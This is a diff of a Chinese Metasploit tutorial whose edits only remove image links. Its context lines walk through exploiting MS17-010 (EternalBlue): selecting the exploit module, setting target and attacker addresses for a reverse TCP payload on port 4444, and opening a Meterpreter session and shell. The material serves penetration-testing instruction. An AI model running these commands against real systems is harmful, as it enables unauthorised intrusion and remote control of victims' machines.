@@ -2,13 +2,11 @@
 
 在本节课中，我们将学习Metasploit框架（MSF）的核心攻击流程。我们将以经典的MS17-010（永恒之蓝）漏洞为例，完整演示从漏洞探测到获取Meterpreter会话，再到进行后渗透操作的整个过程。
 
-![](img/b27fe7d4d6f1cdeb8a26ac957ad1644d_1.png)
 
 ## 概述 📋
 
 Metasploit攻击的最终目标是获取**Meterpreter**会话。无论使用MSF对目标进行何种渗透，最终目的都是拿到Meterpreter以进行后续的渗透操作。
 
-![](img/b27fe7d4d6f1cdeb8a26ac957ad1644d_3.png)
 
 ## 攻击流程详解
 
@@ -80,13 +78,11 @@ exploit
 
 探测到漏洞后，我们需要使用攻击模块进行利用。再次搜索并选择一个攻击模块，例如 `exploit/windows/smb/ms17_010_eternalblue`。
 
-![](img/b27fe7d4d6f1cdeb8a26ac957ad1644d_13.png)
 
 ```bash
 use exploit/windows/smb/ms17_010_eternalblue
 ```
 
-![](img/b27fe7d4d6f1cdeb8a26ac957ad1644d_15.png)
 
 使用 `show options` 查看需要配置的选项。通常需要配置以下两项：
 1.  **RHOSTS**: 目标机器的IP地址。
@@ -94,7 +90,6 @@ use exploit/windows/smb/ms17_010_eternalblue
 
 设置目标地址和载荷。这里我们设置一个反向TCP连接载荷，让目标机器连接回我们的攻击机。
 
-![](img/b27fe7d4d6f1cdeb8a26ac957ad1644d_17.png)
 
 ```bash
 set RHOSTS [目标IP]
@@ -110,7 +105,6 @@ set LHOST [攻击机IP]
 set LPORT 4444
 ```
 
-![](img/b27fe7d4d6f1cdeb8a26ac957ad1644d_19.png)
 
 所有选项配置完毕后，发起攻击。
 
@@ -124,7 +118,6 @@ exploit
 
 Meterpreter是一个功能强大的后渗透工具。在Meterpreter会话中，输入 `?` 或 `help` 可以查看所有可用命令。
 
-![](img/b27fe7d4d6f1cdeb8a26ac957ad1644d_21.png)
 
 以下是主要命令类别介绍：
 *   **核心命令**：如 `background`（会话放到后台）、`sessions`（管理会话）。
@@ -143,7 +136,6 @@ shell
 ```
 进入目标系统的命令行后，可以执行如 `dir`, `whoami` 等命令。退出shell可输入 `exit`。
 
-![](img/b27fe7d4d6f1cdeb8a26ac957ad1644d_23.png)
 
 ### 6. 会话管理
 
